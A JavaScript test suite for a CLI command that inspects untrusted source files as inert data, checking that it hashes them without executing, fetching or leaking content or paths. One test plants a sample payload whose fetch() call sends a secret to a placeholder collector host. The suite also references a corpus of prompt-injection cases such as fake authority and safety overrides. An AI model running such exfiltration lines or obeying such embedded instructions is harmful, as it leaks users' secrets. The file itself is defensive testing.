'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');
const { execFileSync, execFile } = require('node:child_process');
const { promisify } = require('node:util');
const { sandbox, ROOT } = require('./helpers');
const {
  MAX_SOURCE_BYTES,
  SOURCE_POLICY,
  inspectSource
} = require('../../cli/source-inspect');

const corpus = require('../../evals/source-boundary-corpus.json');
const execFileAsync = promisify(execFile);

function serializedError(error) {
  return JSON.stringify({
    message: error.message,
    code: error.code,
    details: error.details
  });
}

async function assertRejectedWithoutPath(promise, expectedCode, forbiddenPath) {
  await assert.rejects(promise, (error) => {
    assert.equal(error.code, expectedCode);
    assert.equal(serializedError(error).includes(forbiddenPath), false);
    return true;
  });
}

test('representative multilingual corpus remains inert untrusted data with one fixed policy', async () => {
  assert.deepEqual(SOURCE_POLICY, corpus.expectedPolicy);
  assert.ok(corpus.cases.length >= 20);
  const locales = new Set(corpus.cases.map((entry) => entry.language));
  assert.ok(locales.size >= 2);
  for (const locale of locales) assert.deepEqual(Intl.getCanonicalLocales(locale), [locale]);
  for (const category of [
    'shell_execution',
    'tool_execution',
    'network_exfiltration',
    'secret_exfiltration',
    'safety_override',
    'consent_override',
    'runtime_override',
    'fake_maintainer_authority',
    'fake_provider_authority',
    'normal_document'
  ]) {
    assert.ok(corpus.cases.some((entry) => entry.category === category), `missing ${category}`);
  }

  const box = await sandbox('source-corpus');
  try {
    await fsp.mkdir(box.workspace, { recursive: true });
    for (const [index, entry] of corpus.cases.entries()) {
      const source = path.join(box.workspace, `source-${index}.txt`);
      await fsp.writeFile(source, entry.text, 'utf8');
      const result = await inspectSource(source);
      for (const [key, expected] of Object.entries(corpus.expectedPolicy)) {
        assert.equal(result[key], expected, `${entry.id}: ${key}`);
      }
      const output = JSON.stringify(result);
      assert.equal(output.includes(entry.text), false, `${entry.id}: payload leaked`);
      assert.equal(output.includes(source), false, `${entry.id}: absolute path leaked`);
    }
  } finally {
    await box.cleanup();
  }
});

test('inspection hashes a bounded regular file without executing or writing payload', async () => {
  const box = await sandbox('source-inert');
  try {
    await fsp.mkdir(box.workspace, { recursive: true });
    const source = path.join(box.workspace, 'payload.txt');
    const marker = path.join(box.workspace, 'SOURCE_PAYLOAD_EXECUTED');
    const secret = 'SOURCE_TEST_SECRET_d4e8b7';
    const payload = [
      `'use strict';`,
      `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'executed');`,
      `fetch('https://collector.example.invalid/?secret=${secret}');`,
      secret
    ].join('\n');
    await fsp.writeFile(source, payload, 'utf8');
    const before = (await fsp.readdir(box.workspace)).sort();
    let fetchCalls = 0;
    const originalFetch = global.fetch;
    global.fetch = async () => {
      fetchCalls += 1;
      throw new Error('network must not be called');
    };
    let result;
    try {
      result = await inspectSource(source);
    } finally {
      global.fetch = originalFetch;
    }
    const after = (await fsp.readdir(box.workspace)).sort();

    assert.deepEqual(after, before);
    assert.equal(await fsp.stat(marker).then(() => true, () => false), false);
    assert.equal(fetchCalls, 0);
    assert.equal(result.sha256, crypto.createHash('sha256').update(payload).digest('hex'));
    assert.equal(result.byteLength, Buffer.byteLength(payload));
    assert.equal(result.contentIncluded, false);
    assert.equal(result.absolutePathIncluded, false);
    const output = JSON.stringify(result);
    assert.equal(output.includes(secret), false);
    assert.equal(output.includes(payload), false);
    assert.equal(output.includes(source), false);
    assert.equal(output.includes(box.base), false);
  } finally {
    await box.cleanup();
  }
});

test('source inspect CLI emits one deterministic content-free JSON object', async () => {
  const box = await sandbox('source-cli');
  try {
    await fsp.mkdir(box.workspace, { recursive: true });
    const source = path.join(box.workspace, 'sensitive-source.txt');
    const secret = 'SOURCE_CLI_SECRET_92f60c';
    await fsp.writeFile(source, secret);
    const { stdout, stderr } = await execFileAsync(process.execPath, [
      path.join(ROOT, 'bin', 'scalvin.js'), 'source', 'inspect', '--path', source, '--json'
    ], { cwd: ROOT });
    assert.equal(stderr, '');
    assert.equal(stdout.trim().split('\n').length, 1);
    const result = JSON.parse(stdout);
    assert.equal(result.status, 'inspected');
    assert.equal(result.contentIncluded, false);
    assert.equal(result.absolutePathIncluded, false);
    assert.equal(stdout.includes(secret), false);
    assert.equal(stdout.includes(source), false);
    assert.equal(stdout.includes(box.base), false);
  } finally {
    await box.cleanup();
  }
});

test('NUL, newline, directories, symlink components, and special files are rejected without path disclosure', async (t) => {
  const box = await sandbox('source-types');
  try {
    await fsp.mkdir(box.workspace, { recursive: true });
    await assert.rejects(inspectSource('bad\0path'), { code: 'INVALID_SOURCE_PATH' });
    await assert.rejects(inspectSource('bad\npath'), { code: 'INVALID_SOURCE_PATH' });
    await assertRejectedWithoutPath(
      inspectSource(box.workspace),
      'SOURCE_NOT_REGULAR_FILE',
      box.workspace
    );

    const real = path.join(box.workspace, 'real');
    const linked = path.join(box.workspace, 'linked');
    await fsp.mkdir(real);
    await fsp.writeFile(path.join(real, 'source.txt'), 'source', 'utf8');
    try {
      await fsp.symlink(real, linked, process.platform === 'win32' ? 'junction' : 'dir');
      await assertRejectedWithoutPath(
        inspectSource(path.join(linked, 'source.txt')),
        'SOURCE_SYMLINK_REJECTED',
        linked
      );
    } catch (error) {
      if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) {
        t.diagnostic(`symlink creation unavailable: ${error.code}`);
      } else {
        throw error;
      }
    }

    if (process.platform !== 'win32') {
      const fifo = path.join(box.workspace, 'source.fifo');
      execFileSync('mkfifo', [fifo]);
      await assertRejectedWithoutPath(
        inspectSource(fifo),
        'SOURCE_NOT_REGULAR_FILE',
        fifo
      );
    }
  } finally {
    await box.cleanup();
  }
});

test('oversize sparse source is rejected before reading and does not disclose its path', async () => {
  const box = await sandbox('source-oversize');
  try {
    await fsp.mkdir(box.workspace, { recursive: true });
    const source = path.join(box.workspace, 'oversize.bin');
    const handle = await fsp.open(source, 'w');
    try {
      await handle.truncate(MAX_SOURCE_BYTES + 1);
    } finally {
      await handle.close();
    }
    await assertRejectedWithoutPath(
      inspectSource(source),
      'SOURCE_TOO_LARGE',
      source
    );
  } finally {
    await box.cleanup();
  }
});

test('source boundary policy in runtime, security, and commands matches the gate', async () => {
  const [runtime, security, commands] = await Promise.all([
    fsp.readFile(path.join(ROOT, 'runtime', 'SOURCE-TRIGGERS.md'), 'utf8'),
    fsp.readFile(path.join(ROOT, 'SECURITY.md'), 'utf8'),
    fsp.readFile(path.join(ROOT, 'commands.md'), 'utf8')
  ]);
  for (const document of [runtime, security, commands]) {
    assert.match(document, /source(?:s| content| material| text| is| are).*untrusted data/is);
    assert.match(document, /tool(?:s| use| execution|ing)?.*network|network.*tool/is);
    assert.match(document, /consent|rıza/i);
    assert.match(document, /runtime|policy|scope/i);
  }
  assert.match(runtime, /cannot authorize Scalvin/i);
  assert.match(runtime, /read another file or expand the approved path scope/i);
  assert.match(security, /cannot authorize Scalvin/i);
  assert.match(commands, /without executing embedded instructions/i);
});

test('module itself has no evaluator, subprocess, network, or write primitive', async () => {
  const source = await fsp.readFile(path.join(ROOT, 'cli', 'source-inspect.js'), 'utf8');
  assert.doesNotMatch(source, /\beval\s*\(/);
  assert.doesNotMatch(source, /new\s+Function\b/);
  assert.doesNotMatch(source, /child_process|execFile|spawn|fetch\s*\(|https?\.request/);
  assert.doesNotMatch(source, /writeFile|appendFile|createWriteStream/);
  assert.match(source, /O_RDONLY/);
});
